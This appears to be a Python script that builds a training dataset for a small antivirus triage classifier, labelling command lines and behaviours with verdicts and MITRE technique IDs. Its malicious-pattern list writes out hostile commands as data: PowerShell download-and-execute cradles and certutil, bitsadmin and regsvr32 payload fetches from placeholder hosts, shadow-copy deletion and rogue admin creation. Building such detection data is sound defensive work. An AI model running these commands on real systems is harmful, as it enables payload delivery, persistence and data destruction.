#!/usr/bin/env python3
"""Generate an AV-specific instruction-tuning dataset for a *small* LLM.

Target: a ~50M model that runs anywhere (CPU). Such a model can't reason
open-endedly, but it CAN learn a narrow, structured labeling task very well.
So this builds short prompt -> short answer pairs for the jobs an embedded AV
assistant actually needs:

  1. cmdline   - classify a command line: verdict + MITRE technique + one line
  2. behavior  - map a behavior summary to a MITRE technique + verdict
  3. explain   - turn structured engine findings into a one-sentence explanation

All examples are DEFENSIVE: inputs are well-known, documented attacker patterns
(or benign baselines); outputs are short labels/explanations - never novel
weaponization. Output is JSONL in either Alpaca or chat format.

  python tools/gen_av_dataset.py --n 6000 --format alpaca \
      --out assets/datasets/av_train.jsonl --eval assets/datasets/av_eval.jsonl
"""
from __future__ import annotations
import argparse, json, random

# --- building blocks (placeholders are randomized for variety) -------------
BENIGN = [
    ("git commit -m {msg}", "developer activity"),
    ("npm install {pkg}", "package install"),
    ("python3 {script}.py --verbose", "script execution"),
    ("apt-get update && apt-get upgrade -y", "system update"),
    ("ssh user@{host}", "remote login"),
    ("ls -la /home/{user}", "directory listing"),
    ("systemctl restart {svc}", "service management"),
    ("curl -fsSL https://{cdn}/file.tar.gz -o /tmp/file.tar.gz", "normal download"),
    ("docker run --rm -it {img} bash", "container run"),
    ("grep -r TODO src/", "code search"),
    ("tar -czf backup.tar.gz /var/www", "backup"),
    ("ffmpeg -i in.mp4 out.webm", "media transcode"),
    # benign PowerShell - critical counterweight so the model doesn't learn
    # "PowerShell == malicious" from the offensive-PS augmentation.
    ("Write-Host {msg}", "PowerShell console output"),
    ("Get-ChildItem -Path {path}", "PowerShell directory listing"),
    ("Get-Process | Select-Object -First 10", "PowerShell process list"),
    ("Import-Module {mod}", "PowerShell module import"),
    ("Get-Content {file}", "PowerShell read file"),
    ("Set-Location {path}", "PowerShell change directory"),
    ("Test-Path {file}", "PowerShell path check"),
    ("Get-Service | Where-Object Status -eq Running", "PowerShell service query"),
    ("$d = Get-Date; Write-Output $d", "PowerShell date"),
    ("Get-ChildItem {path} | Measure-Object", "PowerShell count items"),
    ("Invoke-Pester ./tests", "PowerShell test run"),
    ("New-Item -ItemType Directory -Path {path}", "PowerShell mkdir"),
]
# (pattern, MITRE technique, short reason) - recognizable malicious LOLBin/abuse patterns
MAL = [
    ("powershell -nop -w hidden -enc {b64}", "T1059.001",
     "encoded/hidden PowerShell - likely download-execute cradle"),
    ("powershell IEX (New-Object Net.WebClient).DownloadString('http://{host}/a.ps1')", "T1059.001",
     "PowerShell download-and-execute cradle"),
    ("certutil -urlcache -split -f http://{host}/p.exe p.exe", "T1105",
     "certutil abused to download a payload (ingress tool transfer)"),
    ("regsvr32 /s /n /u /i:http://{host}/x.sct scrobj.dll", "T1218.010",
     "regsvr32 scriptlet execution (signed-binary proxy)"),
    ("mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"calc\")", "T1218.005",
     "mshta executing inline script"),
    ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"", "T1218.011",
     "rundll32 proxy execution"),
    ("wmic process call create \"powershell -enc {b64}\"", "T1047",
     "WMI process creation to spawn a hidden payload"),
    ("bitsadmin /transfer j http://{host}/m.exe C:\\m.exe", "T1197",
     "BITS job used for stealthy download"),
    ("schtasks /create /sc onlogon /tn Updater /tr C:\\m.exe", "T1053.005",
     "scheduled task created for persistence"),
    ("reg add HKCU\\...\\CurrentVersion\\Run /v X /d C:\\m.exe", "T1547.001",
     "Run key added for persistence"),
    ("vssadmin delete shadows /all /quiet", "T1490",
     "deleting volume shadow copies - ransomware recovery inhibition"),
    ("bcdedit /set {{default}} recoveryenabled no", "T1490",
     "disabling recovery - common pre-encryption step"),
    ("net user hacker P@ss /add && net localgroup administrators hacker /add", "T1136.001",
     "rogue local admin account creation"),
    ("nltest /domain_trusts /all_trusts", "T1482", "domain trust discovery"),
]
BEHAVIORS = [
    ("Process allocated RWX memory in another process then started a remote thread", "T1055",
     "malicious", "process injection"),
    ("One process wrote 40+ files with ~7.9 bits/byte entropy then ran vssadmin delete shadows", "T1486",
     "malicious", "ransomware encryption + recovery inhibition"),
    ("winword.exe spawned powershell.exe with an encoded command", "T1566.001",
     "malicious", "Office macro spawning a script interpreter"),
    ("Script host connected to a public IP on port 4444", "T1071",
     "suspicious", "possible C2 beacon"),
    ("New value added under CurrentVersion\\Run pointing to a temp executable", "T1547.001",
     "suspicious", "autostart persistence"),
    ("chrome.exe opened a local file and made no network connections", "-",
     "clean", "ordinary browser activity"),
]
EXPLAIN = [
    ({"engine": "hash", "sig": "Win.Trojan.X", "score": 1.0},
     "Exact SHA-256 match against a known-malware signature - high confidence malicious."),
    ({"engine": "heuristic", "sig": "pe.static.heuristic", "score": 0.85,
      "detail": "very-high-entropy section + W^X + injection imports"},
     "Packed PE with a writable+executable section and injection-capable imports - likely a packed dropper."),
    ({"engine": "sandbox", "sig": "sandbox.shellcode.composite", "score": 0.95},
     "Multiple independent shellcode techniques (PEB walk, API hashing, GetPC) - position-independent shellcode."),
    ({"engine": "anomaly", "sig": "anomaly.novel_lineage", "score": 0.7,
      "detail": "winword.exe>cmd.exe"},
     "Unusual process lineage never seen on this host - Office spawning a shell is a phishing-chain indicator."),
]

def rnd(rng):
    return {
        "msg": rng.choice(["fix bug", "add feature", "wip", "refactor"]),
        "pkg": rng.choice(["react", "lodash", "axios", "left-pad"]),
        "script": rng.choice(["train", "build", "deploy", "main"]),
        "host": f"{rng.choice(['cdn','api','update','x'])}{rng.randint(1,99)}.example{rng.randint(1,9)}.com",
        "user": rng.choice(["alice", "bob", "dev", "svc"]),
        "svc": rng.choice(["nginx", "sshd", "docker", "cron"]),
        "cdn": rng.choice(["releases.example.com", "cdn.example.net"]),
        "img": rng.choice(["ubuntu", "python:3.12", "node:20"]),
        "b64": "".join(rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef=") for _ in range(rng.randint(20, 60))),
        "path": rng.choice([r"C:\\Users\\dev\\Documents", r"C:\\Projects", "./src", r"D:\\data", "$HOME/work"]),
        "file": rng.choice([r"C:\\logs\\app.log", "README.md", "config.yaml", r".\\report.txt", "data.csv"]),
        "mod": rng.choice(["Pester", "PSReadLine", "Az", "PSScriptAnalyzer", "ImportExcel"]),
    }

def make(rng):
    # Pure detector objective: artifact -> "Verdict | MITRE | reason".
    # (No open-ended "assistant" task - the model is a classifier the engine parses.)
    kind = rng.choices(["cmdline_mal", "cmdline_benign", "behavior"],
                       weights=[40, 40, 20])[0]
    if kind == "cmdline_benign":
        tmpl, why = rng.choice(BENIGN)
        cmd = tmpl.format(**rnd(rng))
        return ("Classify this command line. Reply: verdict, MITRE technique (or -), one-line reason.",
                cmd, f"Benign | - | {why}")
    if kind == "cmdline_mal":
        tmpl, tech, why = rng.choice(MAL)
        cmd = tmpl.format(**rnd(rng))
        return ("Classify this command line. Reply: verdict, MITRE technique (or -), one-line reason.",
                cmd, f"Malicious | {tech} | {why}")
    if kind == "behavior":
        desc, tech, verdict, why = rng.choice(BEHAVIORS)
        return ("Given this observed behavior, give the MITRE technique and verdict.",
                desc, f"{verdict.capitalize()} | {tech} | {why}")
    findings, expl = rng.choice(EXPLAIN)
    return ("Explain this detection to an analyst in one sentence.",
            json.dumps(findings), expl)

def to_record(ex, fmt):
    instr, inp, out = ex
    if fmt == "chat":
        return {"messages": [
            {"role": "system", "content": "You are AetherAV, a compact on-device malware triage classifier."},
            {"role": "user", "content": f"{instr}\n{inp}"},
            {"role": "assistant", "content": out}]}
    return {"instruction": instr, "input": inp, "output": out}

def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--n", type=int, default=6000)
    ap.add_argument("--format", choices=["alpaca", "chat"], default="alpaca")
    ap.add_argument("--out", default="assets/datasets/av_train.jsonl")
    ap.add_argument("--eval", default="assets/datasets/av_eval.jsonl")
    ap.add_argument("--eval-frac", type=float, default=0.1)
    args = ap.parse_args()

    rng = random.Random(20260618)
    # De-dup on (instruction,input) so the small model isn't swamped by repeats.
    seen, rows = set(), []
    tries = 0
    while len(rows) < args.n and tries < args.n * 40:
        tries += 1
        ex = make(rng)
        key = (ex[0], ex[1])
        if key in seen:
            continue
        seen.add(key)
        rows.append(ex)
    rng.shuffle(rows)
    n_eval = int(len(rows) * args.eval_frac)
    ev, tr = rows[:n_eval], rows[n_eval:]

    with open(args.out, "w") as f:
        for ex in tr:
            f.write(json.dumps(to_record(ex, args.format)) + "\n")
    with open(args.eval, "w") as f:
        for ex in ev:
            f.write(json.dumps(to_record(ex, args.format)) + "\n")
    print(f"wrote {len(tr)} train + {len(ev)} eval examples ({args.format}) "
          f"-> {args.out}, {args.eval}")

if __name__ == "__main__":
    main()
